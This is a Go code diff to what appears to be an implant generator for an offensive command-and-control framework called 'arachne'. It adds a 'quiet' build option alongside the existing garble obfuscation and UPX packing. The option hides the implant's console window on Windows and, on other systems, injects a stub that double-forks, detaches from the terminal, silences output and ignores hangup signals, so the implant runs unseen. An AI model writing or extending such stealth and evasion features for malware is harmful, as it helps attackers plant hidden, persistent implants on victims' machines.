@@ -27,6 +27,7 @@ type GenerateConfig struct {
 	TargetArch string
 	UseUPX     bool
 	Obfuscate  bool
+	Quiet      bool
 }
 
 func RunGenerate(args []string) error {
@@ -44,6 +45,7 @@ func RunGenerate(args []string) error {
 	fs.StringVar(&cfg.TargetArch, "arch", cfg.TargetArch, "target architecture (amd64, arm64)")
 	fs.BoolVar(&cfg.UseUPX, "upx", true, "compress with UPX")
 	fs.BoolVar(&cfg.Obfuscate, "obfuscate", false, "obfuscate the implant with garble (auto-installs if missing)")
+	fs.BoolVar(&cfg.Quiet, "quiet", false, "suppress output and run in background (no console on Windows)")
 	fs.Parse(args)
 
 	return BuildImplant(cfg)
@@ -66,7 +68,7 @@ func BuildImplant(cfg GenerateConfig) error {
 	implantPeerID, _ := peer.IDFromPublicKey(implantPub)
 	log.Printf("implant PeerID: %s", implantPeerID.String())
 
-	buildDir, err := prepareBuildDir(pubData, privBytes)
+	buildDir, err := prepareBuildDir(pubData, privBytes, cfg.Quiet)
 	if err != nil {
 		return fmt.Errorf("prepare build directory: %w", err)
 	}
@@ -85,6 +87,11 @@ func BuildImplant(cfg GenerateConfig) error {
 
 	goBin := findGo()
 
+	ldflags := "-s -w"
+	if cfg.Quiet && cfg.TargetOS == "windows" {
+		ldflags = "-s -w -H=windowsgui"
+	}
+
 	var builder string
 	var buildArgs []string
 	if cfg.Obfuscate {
@@ -93,11 +100,11 @@ func BuildImplant(cfg GenerateConfig) error {
 			return fmt.Errorf("garble not available: %w", err)
 		}
 		builder = garble
-		buildArgs = []string{"build", "-o", outPath, "-ldflags=-s -w", "./implant/"}
+		buildArgs = []string{"build", "-o", outPath, "-ldflags=" + ldflags, "./implant/"}
 		log.Printf("obfuscating with garble")
 	} else {
 		builder = goBin
-		buildArgs = []string{"build", "-o", outPath, "-ldflags=-s -w", "./implant/"}
+		buildArgs = []string{"build", "-o", outPath, "-ldflags=" + ldflags, "./implant/"}
 	}
 
 	cmd := exec.Command(builder, buildArgs...)
@@ -132,7 +139,7 @@ func BuildImplant(cfg GenerateConfig) error {
 	return nil
 }
 
-func prepareBuildDir(pubKeyData, privKeyData []byte) (string, error) {
+func prepareBuildDir(pubKeyData, privKeyData []byte, quiet bool) (string, error) {
 	dir, err := os.MkdirTemp("", "arachne-build-*")
 	if err != nil {
 		return "", fmt.Errorf("create temp dir: %w", err)
@@ -167,7 +174,50 @@ var embeddedImplantPrivKey = %s
 		return "", fmt.Errorf("write embedded_implant_key.go: %w", err)
 	}
 
+	if quiet {
+		if err := writeQuietStub(coreDir); err != nil {
+			return "", fmt.Errorf("write quiet stub: %w", err)
+		}
+	}
+
 	return dir, nil
+}
+
+func writeQuietStub(coreDir string) error {
+	quietContent := `//go:build !windows
+
+package core
+
+import (
+	"os"
+	"os/signal"
+	"syscall"
+)
+
+func init() {
+	syscall.Umask(0)
+
+	pid, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
+	if pid != 0 {
+		os.Exit(0)
+	}
+
+	pid2, _, _ := syscall.Syscall(syscall.SYS_FORK, 0, 0, 0)
+	if pid2 != 0 {
+		os.Exit(0)
+	}
+
+	syscall.Setsid()
+
+	f, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
+	syscall.Dup2(int(f.Fd()), 0)
+	syscall.Dup2(int(f.Fd()), 1)
+	syscall.Dup2(int(f.Fd()), 2)
+
+	signal.Ignore(syscall.SIGHUP)
+}
+`
+	return os.WriteFile(filepath.Join(coreDir, "quiet.go"), []byte(quietContent), 0644)
 }
 
 func extractEmbeddedSource(dst string) error {
